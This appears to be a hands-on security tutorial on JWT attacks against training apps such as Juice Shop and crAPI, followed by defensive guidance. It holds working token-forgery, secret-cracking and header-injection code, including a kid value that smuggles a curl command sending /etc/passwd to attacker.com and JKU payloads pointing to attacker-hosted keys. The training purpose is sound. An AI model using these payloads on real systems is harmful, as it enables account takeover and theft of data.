# 🔐 JWT Vulnerabilities Tutorial

**Difficulty**: ⭐⭐⭐⭐ (Intermediate)  
**Time Required**: 2-3 hours  
**Applications**: Juice Shop, crAPI, DVWA

## 📚 Table of Contents
1. [What is JWT?](#what-is-jwt)
2. [JWT Structure](#jwt-structure)
3. [Common JWT Vulnerabilities](#common-jwt-vulnerabilities)
4. [Hands-On Practice](#hands-on-practice)
5. [Defense Strategies](#defense-strategies)
6. [Additional Resources](#additional-resources)

---

## 🎯 Learning Objectives

By the end of this tutorial, you will:
- ✅ Understand JWT structure and implementation
- ✅ Identify and exploit common JWT vulnerabilities
- ✅ Bypass signature verification
- ✅ Perform privilege escalation via JWT manipulation
- ✅ Implement secure JWT handling

---

## What is JWT?

JSON Web Token (JWT) is an open standard (RFC 7519) for securely transmitting information between parties as a JSON object. JWTs are commonly used for authentication and information exchange.

### 🎬 Real-World Impact

JWT vulnerabilities have led to:
- **Facebook (2020)**: Account takeover via JWT manipulation
- **Auth0 (2020)**: Authentication bypass in certain configurations
- **Gitlab (2016)**: Arbitrary user impersonation
- **Slack (2016)**: Session hijacking through JWT weakness

### 🔍 Where JWTs Are Used

- 🔑 API Authentication
- 🎫 Single Sign-On (SSO)
- 📱 Mobile app authentication
- 🌐 Microservices communication
- 🔄 OAuth 2.0 implementations

---

## JWT Structure

A JWT consists of three parts separated by dots (`.`):

```
header.payload.signature
```

### Example JWT:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### Decoded:

**Header**:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload**:
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

**Signature**:
```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

---

## Common JWT Vulnerabilities

### 1. None Algorithm (CVE-2015-9235)
Bypassing signature verification by changing algorithm to "none"

### 2. Algorithm Confusion
Switching from RS256 (RSA) to HS256 (HMAC) to use public key as secret

### 3. Weak Secret Keys
Brute-forceable or common secrets like "secret", "key", etc.

### 4. JWT Header Injection
Injecting malicious values in JWT headers (kid, jku, x5u)

### 5. Lack of Expiration
Tokens without exp claim can be valid forever

### 6. Sensitive Data Exposure
Storing sensitive information in the payload

---

## Hands-On Practice

### 🏃 Exercise 1: None Algorithm Attack (Juice Shop)

**Setup**: Login to Juice Shop and capture your JWT  
**Goal**: Bypass authentication by removing signature verification

:::hint 💡 Hint 1: Decode your JWT
Use jwt.io or command line:
```bash
# Split the JWT
echo "YOUR_JWT" | cut -d. -f1 | base64 -d
echo "YOUR_JWT" | cut -d. -f2 | base64 -d
```

What's in the header? What's the algorithm?

:::

:::hint 💡 Hint 2: Modify the algorithm
Change the algorithm in the header:
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Remember to base64url encode it!

:::

:::hint 💡 Hint 3: Remove the signature
A JWT with "none" algorithm should have empty signature:
```
header.payload.
```

Note the trailing dot!

:::

:::hint 🔓 Hint 4
**Step 1**: Decode your JWT
```python
import base64
import json

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."
header, payload, signature = jwt.split('.')

# Decode
header_decoded = base64.urlsafe_b64decode(header + '==')
payload_decoded = base64.urlsafe_b64decode(payload + '==')

print(json.loads(header_decoded))
print(json.loads(payload_decoded))
```

**Step 2**: Modify to admin
```python
# Change header
new_header = {
    "typ": "JWT",
    "alg": "none"
}

# Change payload
new_payload = {
    "status": "success",
    "data": {
        "id": 1,
        "email": "admin@juice-sh.op",
        "role": "admin"
    },
    "iat": 1605532847
}

# Encode
import base64
def base64url_encode(data):
    return base64.urlsafe_b64encode(
        json.dumps(data).encode()
    ).decode().rstrip('=')

new_jwt = f"{base64url_encode(new_header)}.{base64url_encode(new_payload)}."
print(new_jwt)
```

**Step 3**: Use the new JWT
```javascript
// In browser console
localStorage.setItem('token', 'YOUR_NONE_ALGORITHM_JWT');
location.reload();
```

:::

---

### 🏃 Exercise 2: Algorithm Confusion Attack (crAPI)

**Setup**: Application using RS256 (RSA) algorithm  
**Goal**: Change to HS256 and use public key as secret

:::hint 💡 Hint 1: Find the public key
Look for:
- `/jwks.json` endpoint
- `/.well-known/jwks.json`
- Public key in documentation
- SSL certificate (sometimes reused)

:::

:::hint 💡 Hint 2: Convert RS256 to HS256
RS256 uses public/private key pair.
HS256 uses a shared secret.

What if the server accepts HS256 and uses the public key as the secret?

:::

:::hint 💡 Hint 3: Sign with public key
```python
import hmac
import hashlib

# Sign with public key as secret
signature = hmac.new(
    public_key.encode(),
    f"{header}.{payload}".encode(),
    hashlib.sha256
).digest()
```

:::

:::hint 🔓 Hint 4
**Step 1**: Get the public key
```bash
# From JWKS endpoint
curl http://target.com/.well-known/jwks.json

# Or from the JWT itself (if kid header present)
# Decode JWT header and look for 'kid' (key ID)
```

**Step 2**: Create malicious JWT
```python
import jwt
import json

# Public key (example)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqi8TnuQBGXOGx/Lfn4JF
...
-----END PUBLIC KEY-----"""

# Modified payload
payload = {
    "sub": "1",
    "name": "admin",
    "admin": True,
    "iat": 1516239022
}

# Create JWT with HS256 using public key as secret
forged_jwt = jwt.encode(
    payload,
    public_key,
    algorithm='HS256'
)

print(forged_jwt)
```

**Step 3**: Test the attack
```bash
curl -H "Authorization: Bearer YOUR_FORGED_JWT" \
     http://target.com/api/admin
```

:::

---

### 🏃 Exercise 3: Weak Secret Bruteforce

**Setup**: JWT signed with weak secret  
**Goal**: Crack the secret and forge tokens

:::hint 💡 Hint 1: Identify the algorithm
Decode the JWT header. If it's HS256/HS384/HS512, it uses a secret key.

Common weak secrets:
- secret
- password
- 123456
- key
- your-app-name

:::

:::hint 💡 Hint 2: Use a wordlist
Try common passwords:
```bash
# Get a wordlist
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
```

:::

:::hint 💡 Hint 3: Automate the attack
Tools for JWT cracking:
- jwt-cracker
- john the ripper
- hashcat
- jwt_tool

:::

:::hint 🔓 Hint 4
**Method 1: Using jwt_tool**
```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 jwt_tool.py YOUR_JWT -C -d wordlist.txt
```

**Method 2: Using hashcat**
```bash
# Convert JWT to hashcat format
echo "YOUR_JWT" > jwt.txt

# Crack with hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

**Method 3: Python script**
```python
import jwt
import sys

token = "YOUR_JWT_HERE"
wordlist = open('wordlist.txt', 'r')

for word in wordlist:
    secret = word.strip()
    try:
        payload = jwt.decode(token, secret, algorithms=["HS256"])
        print(f"[+] Secret found: {secret}")
        print(f"[+] Payload: {payload}")
        
        # Now forge a new token
        payload['admin'] = True
        payload['role'] = 'admin'
        
        forged = jwt.encode(payload, secret, algorithm='HS256')
        print(f"[+] Forged token: {forged}")
        break
    except:
        pass
```

**Common secrets that work**:
- `secret`
- `password`
- `12345`
- `changeme`
- Application name
- Company name

:::

---

### 🏃 Exercise 4: JWT Header Injection (kid parameter)

**Setup**: JWT with "kid" (Key ID) parameter  
**Goal**: Exploit kid to read files or inject commands

:::hint 💡 Hint 1: Understanding kid parameter
The "kid" parameter specifies which key was used to sign the JWT:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1"
}
```

What if kid is used to read a key file?

:::

:::hint 💡 Hint 2: Path traversal in kid
Try:
```json
{
  "kid": "../../../../../../etc/passwd"
}
```

If the server reads the file as a key, you know the contents!

:::

:::hint 💡 Hint 3: SQL injection in kid
Some implementations query a database:
```sql
SELECT key FROM keys WHERE id = 'kid_value'
```

Try SQL injection!

:::

:::hint 🔓 Hint 4
**Method 1: Path Traversal**
```python
import jwt
import base64

# Exploit to use /dev/null as key (empty)
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../../../../../../dev/null"
}

payload = {
    "user": "admin",
    "role": "admin"
}

# Sign with empty key
token = jwt.encode(payload, '', algorithm='HS256', headers=header)
print(token)
```

**Method 2: Command Injection**
```python
# If kid is passed to a command
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "key.txt; curl http://attacker.com/steal?data=$(cat /etc/passwd | base64)"
}
```

**Method 3: SQL Injection**
```python
# If kid is used in SQL query
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "key1' UNION SELECT 'secret' --"
}

# Now you know the secret is 'secret'
token = jwt.encode(payload, 'secret', algorithm='HS256', headers=header)
```

**Method 4: Use predictable file**
```python
# Use a file with known content
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "/proc/sys/kernel/randomize_va_space"  # Contains "2\n"
}

# Sign with "2\n" as secret
token = jwt.encode(payload, '2\n', algorithm='HS256', headers=header)
```

:::

---

### 🏃 Challenge: JWT Jacking & Advanced Attacks

**Goal**: Combine multiple techniques for account takeover

:::hint 🎯 Hint 1
Advanced JWT attacks:
1. JKU/JWK header injection
2. x5u/x5c certificate injection
3. JWT cross-service relay
4. Time-based attacks

:::

:::hint 💡 Hint 2
JKU specifies where to fetch keys:
```json
{
  "alg": "RS256",
  "jku": "https://trusted.com/jwks.json"
}
```

What if you can change it?

:::

:::hint 🔓 Hint 3
**JKU Header Injection**:
```python
# Step 1: Create your own key pair
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)

public_key = private_key.public_key()

# Step 2: Host malicious JWKS
jwks = {
    "keys": [{
        "kty": "RSA",
        "use": "sig",
        "kid": "malicious-key",
        "n": base64.urlsafe_b64encode(public_key.public_numbers().n.to_bytes(256, 'big')).decode().rstrip('='),
        "e": "AQAB"
    }]
}

# Host this at http://attacker.com/jwks.json

# Step 3: Create JWT with malicious JKU
header = {
    "alg": "RS256",
    "jku": "http://attacker.com/jwks.json",
    "kid": "malicious-key"
}

payload = {"sub": "admin", "admin": True}

# Sign with your private key
token = jwt.encode(payload, private_key, algorithm='RS256', headers=header)
```

**x5u Certificate Chain**:
```python
# Similar to JKU but with X.509 certificates
header = {
    "alg": "RS256",
    "x5u": "http://attacker.com/cert.pem"
}
```

**Cross-Service Relay**:
```python
# JWT from Service A might work on Service B
# if they share the same secret or validation logic

# Get JWT from vulnerable service
jwt_service_a = login_to_service_a()

# Try it on other services
services = ['service-b.com', 'api.service.com', 'admin.service.com']
for service in services:
    response = requests.get(f"https://{service}/api/user", 
                          headers={"Authorization": f"Bearer {jwt_service_a}"})
    if response.status_code == 200:
        print(f"JWT works on {service}!")
```

**Time-based bypass**:
```python
# Some servers have clock skew tolerance
import time

# Create expired token
payload = {
    "sub": "user",
    "exp": int(time.time()) - 3600,  # Expired 1 hour ago
    "admin": True
}

# But with nbf (not before) in future
payload["nbf"] = int(time.time()) + 3600  # Valid in 1 hour

# Exploits poor validation logic
```

:::

---

## Defense Strategies

### 🛡️ Secure JWT Implementation

**1. Strong Secret Keys**
```python
import secrets

# Generate strong secret
secret_key = secrets.token_urlsafe(64)

# Store securely (environment variable)
os.environ['JWT_SECRET'] = secret_key
```

**2. Proper Algorithm Validation**
```python
# Always specify allowed algorithms
def verify_token(token):
    try:
        # NEVER use 'algorithms=jwt.get_unverified_header(token)["alg"]'
        payload = jwt.decode(
            token, 
            secret_key, 
            algorithms=['HS256']  # Explicitly set!
        )
        return payload
    except jwt.InvalidTokenError:
        return None
```

**3. Token Expiration**
```python
def create_token(user_id):
    payload = {
        'user_id': user_id,
        'exp': datetime.utcnow() + timedelta(hours=1),
        'iat': datetime.utcnow(),
        'nbf': datetime.utcnow()
    }
    return jwt.encode(payload, secret_key, algorithm='HS256')
```

**4. Additional Security Headers**
```python
def create_secure_token(user_id):
    # Include security headers
    headers = {
        "typ": "JWT",
        "alg": "RS256",
        "kid": "2023-01-01"  # Rotate keys regularly
    }
    
    payload = {
        'user_id': user_id,
        'exp': datetime.utcnow() + timedelta(hours=1),
        'iat': datetime.utcnow(),
        'jti': str(uuid.uuid4()),  # Unique token ID
        'iss': 'https://yourapp.com',  # Issuer
        'aud': 'https://yourapp.com/api'  # Audience
    }
    
    return jwt.encode(payload, private_key, algorithm='RS256', headers=headers)
```

### 🛡️ Best Practices

1. **Use RS256 over HS256** when possible
2. **Rotate keys regularly**
3. **Implement token revocation** (blacklist/whitelist)
4. **Don't store sensitive data** in JWT payload
5. **Validate all claims** (exp, nbf, iss, aud)
6. **Use secure libraries** and keep them updated

---

## 📊 JWT Security Checklist

### Testing Methodology
- [ ] Decode and analyze JWT structure
- [ ] Test "none" algorithm
- [ ] Test algorithm confusion (RS256 → HS256)
- [ ] Attempt secret cracking
- [ ] Test header injection (kid, jku, x5u)
- [ ] Check token expiration
- [ ] Test token replay attacks
- [ ] Check for sensitive data in payload

### Common Payloads
```python
# None algorithm
{"alg":"none","typ":"JWT"}

# Algorithm confusion
{"alg":"HS256","typ":"JWT"}  # Changed from RS256

# Header injection
{"alg":"HS256","typ":"JWT","kid":"../../etc/passwd"}
{"alg":"RS256","typ":"JWT","jku":"http://evil.com/jwks"}

# Weak secrets to try
secrets = ["secret", "password", "123456", "key", "admin", "jwt", "token"]
```

---

## 🏆 Skill Check

Before moving on, make sure you can:

- [ ] Decode and understand JWT structure
- [ ] Exploit "none" algorithm vulnerability
- [ ] Perform algorithm confusion attacks
- [ ] Crack weak JWT secrets
- [ ] Exploit header injection vulnerabilities
- [ ] Implement secure JWT handling

---

## Additional Resources

### 🔧 Tools
- **jwt_tool**: Swiss army knife for JWT testing
- **JWT.io**: Online JWT decoder/encoder
- **JWTCrack**: Fast JWT cracker
- **Burp JWT Extensions**: Various JWT plugins

### 📖 Further Reading
- [JWT RFC 7519](https://tools.ietf.org/html/rfc7519)
- [JWT Security Best Practices](https://tools.ietf.org/html/rfc8725)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

### 🎥 Video Resources
- [LiveOverflow - JWT Security](https://www.youtube.com/watch?v=NrpDrL3ZYvg)
- [PentesterLab - JWT Tutorial](https://pentesterlab.com/exercises/jwt)

---

**Next Tutorial**: [GraphQL Security](graphql.md) → 